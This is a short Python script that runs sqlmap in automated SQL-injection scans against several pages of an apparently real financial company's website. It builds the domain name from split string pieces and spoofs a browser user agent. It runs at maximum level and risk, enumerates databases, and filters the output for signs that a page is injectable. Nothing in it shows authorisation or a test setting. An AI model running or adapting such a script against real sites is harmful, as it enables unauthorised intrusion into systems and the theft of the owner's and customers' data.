import subprocess
B = "https://www." + "infinity" + "capital" + ".bh"
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
urls = [
    B + "/?id=1&search=test&page=2",
    B + "/?page=2",
    B + "/contact?cb=1&x=1&q=1",
    B + "/api?id=1",
]
KEYS = ["injection", "payload", "did not find", "doesn", "parameter", "testing on",
        "redirect", "errors", "heuristic", "not injectable", "is vulnerable"]
for u in urls:
    print("#" * 20, "sqlmap ::", u, flush=True)
    cmd = ["sqlmap", "-u", u, "--batch", "--level=5", "--risk=3", "--dbs",
           "--threads=4", "--timeout=15", "--retries=1", "-A", UA,
           "--output-dir=tool_outputs/sqlmap_get", "--flush-session"]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=2400)
    out = p.stdout + p.stderr
    for line in out.splitlines():
        low = line.lower()
        if any(k in low for k in KEYS):
            print(line[:200])
    print("rc", p.returncode, flush=True)